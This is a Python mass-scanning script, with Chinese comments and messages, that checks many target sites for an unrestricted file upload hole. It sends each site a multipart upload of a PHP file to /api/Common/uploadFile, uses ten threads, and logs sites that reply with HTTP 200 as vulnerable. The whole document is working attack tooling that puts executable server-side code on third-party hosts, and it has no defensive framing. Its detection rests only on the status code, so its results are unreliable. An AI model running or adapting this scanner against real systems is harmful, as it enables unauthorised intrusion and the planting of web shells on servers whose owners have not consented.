import requests
import argparse
from multiprocessing.dummy import Pool

def banner():
    print("""
 ██▓    ▄▄▄       ███▄ ▄███▓    ██ ▄█▀ ██▓ ███▄    █   ▄████ 
▓██▒   ▒████▄    ▓██▒▀█▀ ██▒    ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██▒   ▒██  ▀█▄  ▓██    ▓██░   ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░██░   ░██▄▄▄▄██ ▒██    ▒██    ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
░██░    ▓█   ▓██▒▒██▒   ░██▒   ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
░▓      ▒▒   ▓▒█░░ ▒░   ░  ░   ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
 ▒ ░     ▒   ▒▒ ░░  ░      ░   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
 ▒ ░     ░   ▒   ░      ░      ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
 ░           ░  ░       ░      ░  ░    ░           ░       ░ 
                                        info:文件上传漏洞检测脚本 
                                        version:1.0 author:YourName               
""")

def check_vulnerability(target_url):
    url = target_url + "/api/Common/uploadFile"
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR"
    }
    data = """------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="file"; filename="1.php"

<?php echo "hello world";?>
------WebKitFormBoundaryj7OlOPiiukkdktZR--"""

    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        if response.status_code == 200:  # you may need to modify conditions based on actual responses
            print(f"[+] {target_url} 存在文件上传漏洞")
            with open('漏洞网站.txt', 'a') as f:
                f.write(target_url + '\n')
        else:
            print(f"[-] {target_url} 不存在文件上传漏洞")
    except Exception as e:
        print(f"[!] 请求 {target_url} 时发生错误: {e}")

def main():
    banner()
    parser = argparse.ArgumentParser(description="文件上传漏洞检测脚本")
    parser.add_argument('-f', '--file', required=True, help='包含多个目标URL的文件')
    args = parser.parse_args()

    with open(args.file, 'r') as file:
        urls = file.readlines()

    pool = Pool(10)  # 设置线程池大小
    pool.map(check_vulnerability, [url.strip() for url in urls if url.strip()])
    pool.close()
    pool.join()

if __name__ == '__main__':
    main()
